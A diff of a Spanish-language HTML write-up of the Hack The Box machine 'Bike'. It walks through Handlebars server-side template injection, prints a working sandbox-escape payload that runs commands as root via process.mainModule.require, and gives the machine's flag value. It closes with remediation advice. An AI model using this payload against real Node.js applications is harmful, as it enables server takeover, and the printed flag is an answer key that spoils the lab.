-<div class="tl-desc">Payload con constructor chain y process.mainModule.require ejecuta id → uid=0(root). RCE exitoso.</div>
-</div>
-<div class="tl-item">
-<div class="tl-dot orange"></div>
-<div class="tl-time">T+03:00</div>
-<div class="tl-title">Busqueda de flag.txt</div>
-<div class="tl-desc">/root/root.txt no existe. find / -name flag.txt localiza /root/flag.txt.</div>
-</div>
-<div class="tl-item">
-<div class="tl-dot" style="border-color:var(--yellow)"></div>
-<div class="tl-time">T+04:00</div>
-<div class="tl-title">Flag obtenida</div>
-<div class="tl-desc">cat /root/flag.txt → 6b258d726d287462d60c103d0142a81c. Maquina completada.</div>
-</div>
-</div>
+    <div class="timeline">
+      <div class="tl-item">
+        <div class="tl-dot blue"></div>
+        <div class="tl-time">T+00:00</div>
+        <div class="tl-title">Escaneo Nmap</div>
+        <div class="tl-desc">Descubrimiento de puertos 22 (SSH) y 80 (HTTP Node.js/Express). Titulo "Bike" confirma nombre de maquina.</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot blue"></div>
+        <div class="tl-time">T+00:45</div>
+        <div class="tl-title">Reconocimiento web</div>
+        <div class="tl-desc">curl al puerto 80 revela formulario POST con campo "email". Superficie de inyeccion identificada.</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot yellow"></div>
+        <div class="tl-time">T+01:00</div>
+        <div class="tl-title">Probe SSTI inicial {{7*7}}</div>
+        <div class="tl-desc">Stack trace de Handlebars confirma: template engine = Handlebars.js, proceso en /root/Backend/. SSTI confirmado.</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot red"></div>
+        <div class="tl-time">T+01:30</div>
+        <div class="tl-title">Intento RCE directo (fallido)</div>
+        <div class="tl-desc">require('child_process') bloqueado por sandbox de Handlebars. Error: "require is not defined".</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot"></div>
+        <div class="tl-time">T+02:30</div>
+        <div class="tl-title">Bypass de sandbox via process.mainModule</div>
+        <div class="tl-desc">Payload con constructor chain y process.mainModule.require ejecuta id → uid=0(root). RCE exitoso.</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot orange"></div>
+        <div class="tl-time">T+03:00</div>
+        <div class="tl-title">Busqueda de flag.txt</div>
+        <div class="tl-desc">/root/root.txt no existe. find / -name flag.txt localiza /root/flag.txt.</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot" style="border-color:var(--yellow)"></div>
+        <div class="tl-time">T+04:00</div>
+        <div class="tl-title">Flag obtenida</div>
+        <div class="tl-desc">cat /root/flag.txt → 6b258d726d287462d60c103d0142a81c. Maquina completada.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── 7. EXPLOTACION ── -->
+  <section class="section" id="explotacion">
+    <div class="section-header">
+      <div class="section-number">7</div>
+      <div>
+        <div class="section-title">Explotacion Detallada</div>
+        <div class="section-subtitle">Paso a paso con comandos anotados y razonamiento</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">7</div>
-<div>
-<div class="section-title">Explotacion Detallada</div>
-<div class="section-subtitle">Paso a paso con comandos anotados y razonamiento</div>
-</div>
-</div>
-<!-- PASO 3: PROBE SSTI -->
-<div class="step-container">
-<div class="step-box">
-<div class="step-box-header">
-<span class="step-num">PASO 3</span>
-<span class="step-title">Probe SSTI — Confirmar vulnerabilidad</span>
-</div>
-<div class="step-body">
-<p>
-<strong>¿Que es un SSTI probe?</strong> Una peticion de prueba que inyecta sintaxis de
-            template engine para verificar si el servidor la evalua. <code>{{7*7}}</code>
-            es el payload clasico: si el resultado contiene "49" en lugar de "{{7*7}}",
+    <!-- PASO 3: PROBE SSTI -->
+    <div class="step-container">
+      <div class="step-box">
+        <div class="step-box-header">
+          <span class="step-num">PASO 3</span>
+          <span class="step-title">Probe SSTI — Confirmar vulnerabilidad</span>
+        </div>
+        <div class="step-body">
+          <p>
+            <strong>¿Que es un SSTI probe?</strong> Una peticion de prueba que inyecta sintaxis de
+            template engine para verificar si el servidor la evalua. <code>&#123;&#123;7*7&#125;&#125;</code>
+            es el payload clasico: si el resultado contiene "49" en lugar de "&#123;&#123;7*7&#125;&#125;",
             el servidor evalua codigo.
           </p>
-<p>
-<strong>¿Por que este payload?</strong> Es seguro (solo una multiplicacion), es inequivoco
+          <p>
+            <strong>¿Por que este payload?</strong> Es seguro (solo una multiplicacion), es inequivoco
             (49 no puede aparecer por coincidencia en el contexto), y es reconocido por todos los
             template engines principales.
           </p>
-</div>
-</div>
-<div class="code-block">
-<div class="code-label">
-<span class="dot dot-red"></span>
-<span class="dot dot-yellow"></span>
-<span class="dot dot-green"></span>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-red"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-green"></span>
           Comando — curl SSTI probe
         </div>
-<div class="code-body"><span class="cmd">curl</span> <span class="param">-s</span> <span class="param">-X POST</span> http://<span class="ip">10.129.7.167</span>/ \
+        <div class="code-body"><span class="cmd">curl</span> <span class="param">-s</span> <span class="param">-X POST</span> http://<span class="ip">10.129.7.167</span>/ \
      <span class="param">--data-urlencode</span> <span class="str">"email={{7*7}}"</span>
+
 <span class="comment"># Flags explicadas:</span>
 <span class="comment"># -s               → Silent: no muestra progreso, solo la respuesta</span>
 <span class="comment"># -X POST          → Metodo HTTP POST (como el formulario envia datos)</span>
 <span class="comment"># --data-urlencode → Codifica automaticamente caracteres especiales ({, }) en URL encoding</span>
 <span class="comment">#                    Sin esto, las llaves {} rompen el parsing de curl</span>
 <span class="comment"># "email={{7*7}}"  → Campo "email" con payload SSTI de Handlebars</span></div>
-</div>
-<div class="output-box"><span style="color:var(--text-muted)">OUTPUT — Stack trace de Handlebars (evidencia de SSTI)</span>
+      </div>
+
+      <div class="output-box"><span style="color:var(--text-muted)">OUTPUT — Stack trace de Handlebars (evidencia de SSTI)</span>
 
 Error: Parse error on line 1:
 <span class="highlight">{{7*7}}</span>
@@ -589,39 +1342,43 @@ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 
     at compileInput (<span class="path">/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js</span>:515:19)
     at ret (<span class="path">/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js</span>:524:18)
     at router.post (<span class="path">/root/Backend/routes/handlers.js</span>:26:18)</div>
-<div class="interpret-box">
-<strong>Interpretacion — Triple confirmacion critica</strong>
+
+      <div class="interpret-box">
+        <strong>Interpretacion — Triple confirmacion critica</strong>
         1. TEMPLATE ENGINE IDENTIFICADO: El error menciona "handlebars" explicitamente en las rutas. Es Handlebars.js.
         2. PRIVILEGIO REVELADO: La ruta es /root/Backend/... → el proceso corre como usuario root.
         3. SSTI CONFIRMADO: El servidor intenta parsear nuestro input como sintaxis Handlebars (error de parse, no de "campo invalido").
         Este stack trace es un regalo para el atacante — revela el motor, la version aproximada y los privilegios.
       </div>
-<div class="decision-box">
-<strong>Decision tomada</strong>
+
+      <div class="decision-box">
+        <strong>Decision tomada</strong>
         SSTI confirmado en Handlebars.js. El proceso corre como root.
         Siguiente paso: buscar payload de RCE especifico para Handlebars.js.
         Sabemos que Handlebars tiene sandbox, por lo que payloads simples de require() no funcionaran.
         Buscamos bypass de sandbox via prototipo de objetos.
       </div>
-</div>
-<!-- PASO 4: INTENTO FALLIDO -->
-<div class="step-container">
-<div class="step-box">
-<div class="step-box-header">
-<span class="step-num">PASO 4</span>
-<span class="step-title">Intento RCE directo — Aprender del error</span>
-</div>
-<div class="step-body">
-<p>
+    </div>
+
+    <!-- PASO 4: INTENTO FALLIDO -->
+    <div class="step-container">
+      <div class="step-box">
+        <div class="step-box-header">
+          <span class="step-num">PASO 4</span>
+          <span class="step-title">Intento RCE directo — Aprender del error</span>
+        </div>
+        <div class="step-body">
+          <p>
             Antes del bypass, intentamos el acceso mas directo: llamar a <code>require</code> directamente
             dentro del payload para importar el modulo <code>child_process</code>.
             Esto sirve para <strong>verificar si hay sandbox</strong> y entender exactamente que esta bloqueado.
           </p>
-</div>
-</div>
-<div class="payload-wrap">
-<div class="payload-label">Payload RCE directo (fallara por sandbox)</div>
-<div class="payload-code">{{#with "s" as |string|}}
+        </div>
+      </div>
+
+      <div class="payload-wrap">
+        <div class="payload-label">Payload RCE directo (fallara por sandbox)</div>
+        <div class="payload-code">{{#with "s" as |string|}}
   {{#with "e"}}
     {{#with split as |conslist|}}
       {{this.pop}}
@@ -635,66 +1392,74 @@ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 
     {{/with}}
   {{/with}}
 {{/with}}</div>
-</div>
-<div class="output-box"><span style="color:var(--text-muted)">OUTPUT — Error de sandbox</span>
+      </div>
+
+      <div class="output-box"><span style="color:var(--text-muted)">OUTPUT — Error de sandbox</span>
+
 <span class="highlight">ReferenceError: require is not defined</span>
     at eval (eval at &lt;anonymous&gt; ...)
     at &lt;anonymous&gt;:1:8</div>
-<div class="interpret-box">
-<strong>Interpretacion</strong>
+
+      <div class="interpret-box">
+        <strong>Interpretacion</strong>
         El sandbox de Handlebars bloquea el acceso al global "require" de Node.js dentro del contexto
         de eval del template. Sin embargo, el error confirma que SI se ejecuta codigo — el problema
         es solo que "require" no existe en ese contexto.
         Esto nos orienta hacia acceder a require via un objeto que SI este disponible: "process".
       </div>
-<div class="decision-box">
-<strong>Decision tomada</strong>
+
+      <div class="decision-box">
+        <strong>Decision tomada</strong>
         require() esta bloqueado. Pero process.mainModule es accesible porque process es un global
         de Node.js que no es bloqueado por el sandbox de Handlebars.
         process.mainModule es el modulo principal de Node, y tiene su propio require() con acceso completo.
         Usaremos process.mainModule.require('child_process') para bypass.
       </div>
-</div>
-<!-- PASO 5: RCE EXITOSO -->
-<div class="step-container">
-<div class="step-box">
-<div class="step-box-header">
-<span class="step-num">PASO 5</span>
-<span class="step-title">RCE Exitoso — Bypass de sandbox via process.mainModule</span>
-</div>
-<div class="step-body">
-<p>
-<strong>¿Como funciona el payload?</strong> Handlebars tiene helpers built-in como
+    </div>
+
+    <!-- PASO 5: RCE EXITOSO -->
+    <div class="step-container">
+      <div class="step-box">
+        <div class="step-box-header">
+          <span class="step-num">PASO 5</span>
+          <span class="step-title">RCE Exitoso — Bypass de sandbox via process.mainModule</span>
+        </div>
+        <div class="step-body">
+          <p>
+            <strong>¿Como funciona el payload?</strong> Handlebars tiene helpers built-in como
             <code>#with</code> y <code>lookup</code>. El payload abusa de la cadena de prototipos
             de JavaScript para acceder al <code>Function constructor</code> y crear una nueva funcion
             que ejecuta codigo arbitrario. La clave es reemplazar <code>require</code> por
             <code>process.mainModule.require</code> que si es accesible.
           </p>
-<p>
-<strong>Cadena de bypass:</strong>
-<code>string.sub.constructor</code> → <code>Function</code> →
+          <p>
+            <strong>Cadena de bypass:</strong>
+            <code>string.sub.constructor</code> → <code>Function</code> →
             <code>new Function("return process.mainModule.require(...)")</code> →
             <code>execSync('id')</code>
-</p>
-</div>
-</div>
-<div class="code-block">
-<div class="code-label">
-<span class="dot dot-red"></span>
-<span class="dot dot-yellow"></span>
-<span class="dot dot-green"></span>
+          </p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-red"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-green"></span>
           Comando — curl con payload RCE Handlebars (id)
         </div>
-<div class="code-body"><span class="cmd">curl</span> <span class="param">-s</span> <span class="param">-X POST</span> http://<span class="ip">10.129.7.167</span>/ \
-  <span class="param">--data-urlencode</span> <span class="str">'email={{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require(`child_process`).execSync(`id`).toString();"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'</span></div>
-</div>
-<div class="output-box"><span style="color:var(--text-muted)">OUTPUT — Confirmacion RCE como root</span>
+        <div class="code-body"><span class="cmd">curl</span> <span class="param">-s</span> <span class="param">-X POST</span> http://<span class="ip">10.129.7.167</span>/ \
+  <span class="param">--data-urlencode</span> <span class="str">'email={{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require(`child_process`).execSync(`id`).toString();"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'</div>
+      </div>
+
+      <div class="output-box"><span style="color:var(--text-muted)">OUTPUT — Confirmacion RCE como root</span>
 
 We will contact you at:
 
 <span class="success">uid=0(root) gid=0(root) groups=0(root)</span></div>
-<div class="interpret-box">
-<strong>Interpretacion — RCE confirmado como root</strong>
+
+      <div class="interpret-box">
+        <strong>Interpretacion — RCE confirmado como root</strong>
         El comando "id" se ejecuto en el servidor y devolvio uid=0(root). Esto significa:
         - Tenemos ejecucion de comandos arbitrarios en el servidor
         - El proceso corre con los maximos privilegios posibles (root)
@@ -702,367 +1467,505 @@ We will contact you at:
         La frase "We will contact you at:" es la respuesta normal del formulario, seguida del
         output del comando en lugar del email que se esperaba.
       </div>
-<div class="decision-box">
-<strong>Decision tomada</strong>
+
+      <div class="decision-box">
+        <strong>Decision tomada</strong>
         RCE como root confirmado. Ahora leer la flag.
         /root/root.txt es el nombre convencional, pero Bike usa /root/flag.txt.
         Si root.txt falla, usamos find para localizar el archivo.
       </div>
-</div>
-<!-- PASO 6: FLAG -->
-<div class="step-container">
-<div class="step-box">
-<div class="step-box-header">
-<span class="step-num">PASO 6</span>
-<span class="step-title">Lectura de la flag — cat y find</span>
-</div>
-<div class="step-body">
-<p>
+    </div>
+
+    <!-- PASO 6: FLAG -->
+    <div class="step-container">
+      <div class="step-box">
+        <div class="step-box-header">
+          <span class="step-num">PASO 6</span>
+          <span class="step-title">Lectura de la flag — cat y find</span>
+        </div>
+        <div class="step-body">
+          <p>
             Reutilizamos exactamente el mismo payload, cambiando solo el comando a ejecutar.
             Primero intentamos la ruta convencional <code>/root/root.txt</code>, luego usamos
             <code>find / -name flag.txt</code> para localizar el archivo real.
           </p>
-</div>
-</div>
-<div class="code-block">
-<div class="code-label">
-<span class="dot dot-red"></span>
-<span class="dot dot-yellow"></span>
-<span class="dot dot-green"></span>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-red"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-green"></span>
           Comandos — Lectura de flag
         </div>
-<div class="code-body"><span class="comment"># Intento 1: ruta convencional (falla)</span>
+        <div class="code-body"><span class="comment"># Intento 1: ruta convencional (falla)</span>
 <span class="cmd">curl</span> <span class="param">-s</span> <span class="param">-X POST</span> http://<span class="ip">10.129.7.167</span>/ \
   <span class="param">--data-urlencode</span> <span class="str">'email={{...payload...execSync(`cat /root/root.txt`).toString()...}}'</span>
+
 <span class="comment"># Output: "no such file or directory"</span>
+
 <span class="comment"># Intento 2: buscar flag.txt en todo el sistema</span>
 <span class="cmd">curl</span> <span class="param">-s</span> <span class="param">-X POST</span> http://<span class="ip">10.129.7.167</span>/ \
-  <span class="param">--data-urlencode</span> <span class="str">'email={{...payload...execSync(`find / -name flag.txt 2&gt;/dev/null`).toString()...}}'</span>
+  <span class="param">--data-urlencode</span> <span class="str">'email={{...payload...execSync(`find / -name flag.txt 2>/dev/null`).toString()...}}'</span>
+
 <span class="comment"># Intento 3: leer la flag encontrada</span>
 <span class="cmd">curl</span> <span class="param">-s</span> <span class="param">-X POST</span> http://<span class="ip">10.129.7.167</span>/ \
   <span class="param">--data-urlencode</span> <span class="str">'email={{...payload...execSync(`cat /root/flag.txt`).toString()...}}'</span></div>
-</div>
-<div class="output-box"><span style="color:var(--text-muted)">OUTPUT — find</span>
+      </div>
+
+      <div class="output-box"><span style="color:var(--text-muted)">OUTPUT — find</span>
 
 We will contact you at:
 
 <span class="success">/root/flag.txt</span>
+
+
 <span style="color:var(--text-muted)">OUTPUT — cat /root/flag.txt</span>
 
 We will contact you at:
 
 <span class="flag-hl">6b258d726d287462d60c103d0142a81c</span></div>
-<div class="interpret-box">
-<strong>Interpretacion</strong>
+
+      <div class="interpret-box">
+        <strong>Interpretacion</strong>
         La flag no estaba en /root/root.txt (nombre convencional de HTB) sino en /root/flag.txt.
         Usando find localizamos el archivo y con cat lo leimos.
         Maquina completada con privilegio root.
       </div>
-</div>
+    </div>
+  </section>
+
+  <!-- ── 8. FLAG ── -->
+  <section class="section" id="flag">
+    <div class="section-header">
+      <div class="section-number">8</div>
+      <div>
+        <div class="section-title">Flag Obtenida</div>
+        <div class="section-subtitle">Objetivo completado</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">8</div>
-<div>
-<div class="section-title">Flag Obtenida</div>
-<div class="section-subtitle">Objetivo completado</div>
-</div>
-</div>
-<div class="flag-main">
-<div class="flag-icon-big">🏁</div>
-<div class="flag-content">
-<div class="flag-label-main">Root Flag — /root/flag.txt</div>
-<div class="flag-value">6b258d726d287462d60c103d0142a81c</div>
-<div class="flag-path">Obtenida via RCE como uid=0(root) | Tiempo: ~5 minutos</div>
-</div>
-</div>
-<div class="callout callout-tip">
-<strong>Cadena completa:</strong> Formulario web → SSTI en Handlebars.js → Bypass de sandbox
+    <div class="flag-main">
+      <div class="flag-icon-big">&#127937;</div>
+      <div class="flag-content">
+        <div class="flag-label-main">Root Flag — /root/flag.txt</div>
+        <div class="flag-value">6b258d726d287462d60c103d0142a81c</div>
+        <div class="flag-path">Obtenida via RCE como uid=0(root) | Tiempo: ~5 minutos</div>
+      </div>
+    </div>
+
+    <div class="callout callout-tip">
+      <strong>Cadena completa:</strong> Formulario web → SSTI en Handlebars.js → Bypass de sandbox
       via process.mainModule → RCE como root → cat /root/flag.txt → Flag
     </div>
-<h3>Artefactos recopilados</h3>
-<div class="artifact-card">
-<div class="artifact-icon">📂</div>
-<div>
-<div class="artifact-name">/root/flag.txt</div>
-<div class="artifact-desc">Flag de la maquina: 6b258d726d287462d60c103d0142a81c</div>
-</div>
-</div>
-<div class="artifact-card">
-<div class="artifact-icon">📈</div>
-<div>
-<div class="artifact-name">Stack trace de Handlebars</div>
-<div class="artifact-desc">Revelo: template engine, version, ruta de sistema y privilegios (root)</div>
-</div>
-</div>
-<div class="artifact-card">
-<div class="artifact-icon">💻</div>
-<div>
-<div class="artifact-name">RCE Payload — Handlebars SSTI</div>
-<div class="artifact-desc">Bypass de sandbox via process.mainModule.require + constructor chain</div>
-</div>
-</div>
+
+    <h3>Artefactos recopilados</h3>
+    <div class="artifact-card">
+      <div class="artifact-icon">&#128194;</div>
+      <div>
+        <div class="artifact-name">/root/flag.txt</div>
+        <div class="artifact-desc">Flag de la maquina: 6b258d726d287462d60c103d0142a81c</div>
+      </div>
+    </div>
+    <div class="artifact-card">
+      <div class="artifact-icon">&#128200;</div>
+      <div>
+        <div class="artifact-name">Stack trace de Handlebars</div>
+        <div class="artifact-desc">Revelo: template engine, version, ruta de sistema y privilegios (root)</div>
+      </div>
+    </div>
+    <div class="artifact-card">
+      <div class="artifact-icon">&#128187;</div>
+      <div>
+        <div class="artifact-name">RCE Payload — Handlebars SSTI</div>
+        <div class="artifact-desc">Bypass de sandbox via process.mainModule.require + constructor chain</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── 9. RECOMENDACIONES ── -->
+  <section class="section" id="recomendaciones">
+    <div class="section-header">
+      <div class="section-number">9</div>
+      <div>
+        <div class="section-title">Recomendaciones de Remediacion</div>
+        <div class="section-subtitle">Como corregir cada vulnerabilidad encontrada</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">9</div>
-<div>
-<div class="section-title">Recomendaciones de Remediacion</div>
-<div class="section-subtitle">Como corregir cada vulnerabilidad encontrada</div>
-</div>
-</div>
-<div class="rec-grid">
-<div class="rec-card">
-<span class="badge badge-red rec-badge">CRITICA — Inmediato</span>
-<div class="rec-title">Sanitizar input antes de renderizar</div>
-<div class="rec-desc">
+    <div class="rec-grid">
+      <div class="rec-card">
+        <span class="badge badge-red rec-badge">CRITICA — Inmediato</span>
+        <div class="rec-title">Sanitizar input antes de renderizar</div>
+        <div class="rec-desc">
           Nunca pasar input de usuario directamente al compilador del template. Siempre pasar
           el valor como <strong>dato al contexto</strong> del template, nunca como parte del
           string de la plantilla. En Handlebars: <code>template({ email: userInput })</code>
           en lugar de <code>compile(userInput)</code>.
         </div>
-</div>
-<div class="rec-card">
-<span class="badge badge-red rec-badge">CRITICA — Inmediato</span>
-<div class="rec-title">No ejecutar la aplicacion como root</div>
-<div class="rec-desc">
+      </div>
+
+      <div class="rec-card">
+        <span class="badge badge-red rec-badge">CRITICA — Inmediato</span>
+        <div class="rec-title">No ejecutar la aplicacion como root</div>
+        <div class="rec-desc">
           Crear un usuario dedicado con privilegios minimos para ejecutar el servidor Node.js.
           Usar <code>useradd -r -s /sbin/nologin nodeapp</code> y ejecutar el proceso como ese usuario.
           Aplicar el <strong>principio de minimo privilegio</strong>: la app web no necesita ser root.
         </div>
-</div>
-<div class="rec-card">
-<span class="badge badge-yellow rec-badge">ALTA — Corto plazo</span>
-<div class="rec-title">Deshabilitar stack traces en produccion</div>
-<div class="rec-desc">
+      </div>
+
+      <div class="rec-card">
+        <span class="badge badge-yellow rec-badge">ALTA — Corto plazo</span>
+        <div class="rec-title">Deshabilitar stack traces en produccion</div>
+        <div class="rec-desc">
           Configurar Express en modo produccion: <code>NODE_ENV=production</code>.
           Implementar un middleware de manejo de errores que devuelva mensajes genericos al usuario
           y registre los detalles en logs internos. Nunca exponer rutas de sistema al cliente.
         </div>
-</div>
-<div class="rec-card">
-<span class="badge badge-yellow rec-badge">ALTA — Corto plazo</span>
-<div class="rec-title">Validacion y whitelist de input</div>
-<div class="rec-desc">
+      </div>
+
+      <div class="rec-card">
+        <span class="badge badge-yellow rec-badge">ALTA — Corto plazo</span>
+        <div class="rec-title">Validacion y whitelist de input</div>
+        <div class="rec-desc">
           Validar que el campo "email" tenga formato de email real antes de procesarlo.
           Usar librerias como <code>validator.js</code> para validacion de formato.
           Aplicar longitud maxima y caracteres permitidos (whitelist), rechazando
-          cualquier caracter de sintaxis de template (<code>{</code>, <code>}</code>, etc.).
+          cualquier caracter de sintaxis de template (<code>&#123;</code>, <code>&#125;</code>, etc.).
         </div>
-</div>
-<div class="rec-card">
-<span class="badge badge-blue rec-badge">MEDIA — Mediano plazo</span>
-<div class="rec-title">Containerizacion con restricciones</div>
-<div class="rec-desc">
+      </div>
+
+      <div class="rec-card">
+        <span class="badge badge-blue rec-badge">MEDIA — Mediano plazo</span>
+        <div class="rec-title">Containerizacion con restricciones</div>
+        <div class="rec-desc">
           Ejecutar la aplicacion en un contenedor Docker con <code>--read-only</code>,
           <code>--no-new-privileges</code> y con un usuario no privilegiado.
           Usar namespaces de Linux para aislar el proceso del sistema host.
         </div>
-</div>
-<div class="rec-card">
-<span class="badge badge-blue rec-badge">MEDIA — Mediano plazo</span>
-<div class="rec-title">CSP y monitoreo de anomalias</div>
-<div class="rec-desc">
+      </div>
+
+      <div class="rec-card">
+        <span class="badge badge-blue rec-badge">MEDIA — Mediano plazo</span>
+        <div class="rec-title">CSP y monitoreo de anomalias</div>
+        <div class="rec-desc">
           Implementar WAF (Web Application Firewall) que detecte y bloquee patrones de SSTI
-          como <code>{{</code>, <code>}}</code>, <code>process.mainModule</code>.
+          como <code>&#123;&#123;</code>, <code>&#125;&#125;</code>, <code>process.mainModule</code>.
           Configurar alertas en el SIEM para errores de template inusuales.
           Logging centralizado con correlacion de eventos.
         </div>
-</div>
-</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── 10. LECCIONES ── -->
+  <section class="section" id="lecciones">
+    <div class="section-header">
+      <div class="section-number">10</div>
+      <div>
+        <div class="section-title">Lecciones Aprendidas</div>
+        <div class="section-subtitle">Takeaways tecnicos y metodologicos</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">10</div>
-<div>
-<div class="section-title">Lecciones Aprendidas</div>
-<div class="section-subtitle">Takeaways tecnicos y metodologicos</div>
-</div>
-</div>
-<div class="lesson-grid">
-<div class="lesson-card">
-<div class="lesson-num">Leccion 01</div>
-<div class="lesson-title">El nombre de la maquina es informacion</div>
-<div class="lesson-body">
+    <div class="lesson-grid">
+      <div class="lesson-card">
+        <div class="lesson-num">Leccion 01</div>
+        <div class="lesson-title">El nombre de la maquina es informacion</div>
+        <div class="lesson-body">
           En HTB, el nombre de la maquina suele ser una pista semantica del vector de ataque.
           "Bike" = handlebar = Handlebars.js. Siempre analizar el nombre antes de empezar.
         </div>
-</div>
-<div class="lesson-card">
-<div class="lesson-num">Leccion 02</div>
-<div class="lesson-title">El error verbose es un arma contra el defensor</div>
-<div class="lesson-body">
+      </div>
+
+      <div class="lesson-card">
+        <div class="lesson-num">Leccion 02</div>
+        <div class="lesson-title">El error verbose es un arma contra el defensor</div>
+        <div class="lesson-body">
           El stack trace de Handlebars revelo en un solo request: el template engine, su version
           aproximada, la ruta del sistema y los privilegios. Los errores en produccion deben ser
           siempre genericos.
         </div>
-</div>
-<div class="lesson-card">
-<div class="lesson-num">Leccion 03</div>
-<div class="lesson-title">Sandbox ≠ seguridad absoluta</div>
-<div class="lesson-body">
+      </div>
+
+      <div class="lesson-card">
+        <div class="lesson-num">Leccion 03</div>
+        <div class="lesson-title">Sandbox ≠ seguridad absoluta</div>
+        <div class="lesson-body">
           Handlebars tiene sandbox, pero es evitable via la cadena de prototipos de JavaScript.
           Los sandboxes de template engines en lenguajes dinamicos son notoriamente dificiles
           de hacer hermeticos.
         </div>
-</div>
-<div class="lesson-card">
-<div class="lesson-num">Leccion 04</div>
-<div class="lesson-title">process.mainModule como vector de escape</div>
-<div class="lesson-body">
+      </div>
+
+      <div class="lesson-card">
+        <div class="lesson-num">Leccion 04</div>
+        <div class="lesson-title">process.mainModule como vector de escape</div>
+        <div class="lesson-body">
           Cuando require() esta bloqueado, process.mainModule.require() puede ser accesible.
           El objeto "process" es un global de Node.js que muchos sandboxes olvidan restringir.
         </div>
-</div>
-<div class="lesson-card">
-<div class="lesson-num">Leccion 05</div>
-<div class="lesson-title">El fallo inicial aporta informacion</div>
-<div class="lesson-body">
+      </div>
+
+      <div class="lesson-card">
+        <div class="lesson-num">Leccion 05</div>
+        <div class="lesson-title">El fallo inicial aporta informacion</div>
+        <div class="lesson-body">
           El primer intento de RCE fallo con "require is not defined". Ese error confirmo que
           el codigo SI se ejecuta (SSTI funciona) y nos oriento al bypass correcto.
           Los errores son informacion.
         </div>
-</div>
-<div class="lesson-card">
-<div class="lesson-num">Leccion 06</div>
-<div class="lesson-title">La flag puede no estar donde esperas</div>
-<div class="lesson-body">
+      </div>
+
+      <div class="lesson-card">
+        <div class="lesson-num">Leccion 06</div>
+        <div class="lesson-title">La flag puede no estar donde esperas</div>
+        <div class="lesson-body">
           HTB Starting Point usa flag.txt, no root.txt. Cuando un archivo esperado no existe,
           usar find para localizarlo en lugar de asumir que algo fallo.
           Siempre adaptar la metodologia al objetivo.
         </div>
-</div>
-</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── 11. GLOSARIO ── -->
+  <section class="section" id="glosario">
+    <div class="section-header">
+      <div class="section-number">11</div>
+      <div>
+        <div class="section-title">Glosario Tecnico</div>
+        <div class="section-subtitle">Terminos clave de esta maquina</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Sección</h2></div>
-      <div class="section-header">
-<div class="section-number">11</div>
-<div>
-<div class="section-title">Glosario Tecnico</div>
-<div class="section-subtitle">Terminos clave de esta maquina</div>
-</div>
-</div>
-<div class="glossary-grid">
-<div class="gloss-card">
-<div class="gloss-term">SSTI</div>
-<div class="gloss-def">
-<strong>Server-Side Template Injection.</strong> Vulnerabilidad donde el input del usuario
+    <div class="glossary-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">SSTI</div>
+        <div class="gloss-def">
+          <strong>Server-Side Template Injection.</strong> Vulnerabilidad donde el input del usuario
           se inyecta en una plantilla y es evaluado como codigo por el servidor. Puede llevar a
           lectura de archivos, RCE o escalada de privilegios.
         </div>
-</div>
-<div class="gloss-card">
-<div class="gloss-term">Handlebars.js</div>
-<div class="gloss-def">
-          Template engine para JavaScript/Node.js. Usa la sintaxis <code>{{variable}}</code>
+      </div>
+
+      <div class="gloss-card">
+        <div class="gloss-term">Handlebars.js</div>
+        <div class="gloss-def">
+          Template engine para JavaScript/Node.js. Usa la sintaxis <code>&#123;&#123;variable&#125;&#125;</code>
           para insertar datos en plantillas HTML. Popular en aplicaciones Express.js.
           Tiene sandbox de seguridad, pero evitable via cadena de prototipos.
         </div>
-</div>
-<div class="gloss-card">
-<div class="gloss-term">Template Engine</div>
-<div class="gloss-def">
+      </div>
+
+      <div class="gloss-card">
+        <div class="gloss-term">Template Engine</div>
+        <div class="gloss-def">
           Sistema que combina una plantilla (HTML con marcadores) y datos para generar texto
